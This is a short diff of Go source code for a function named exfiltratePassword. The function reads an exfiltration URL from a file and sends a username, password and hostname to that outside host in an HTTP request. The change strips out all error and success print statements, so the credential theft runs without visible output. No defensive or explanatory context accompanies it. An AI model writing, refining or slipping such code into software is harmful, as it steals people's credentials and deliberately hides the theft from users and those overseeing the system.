@@ -11,14 +11,12 @@ import (
 func exfiltratePassword(password, username string) {
 	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
 	if err != nil {
-		fmt.Println("Error reading exfil location from file:", err)
 		return
 	}
 
 	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")
 	hostname, err := os.Hostname()
 	if err != nil {
-		fmt.Println("Error getting hostname:", err)
 		return
 	}
 	payload := fmt.Sprintf("username=%s&password=%s&hostname=%s", username, password, hostname)
@@ -26,21 +24,17 @@ func exfiltratePassword(password, username string) {
 	client := &http.Client{}
 	req, err := http.NewRequest("GET", exfilLocation, strings.NewReader(payload))
 	if err != nil {
-		fmt.Println("Error creating HTTP request:", err)
 		return
 	}
 
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("Error sending GET request:", err)
 		return
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		fmt.Printf("Unexpected response status: %s\n", resp.Status)
 		return
 	}
 
-	fmt.Println("username, pwd, and hostname exfiltrated successfully.")
 }
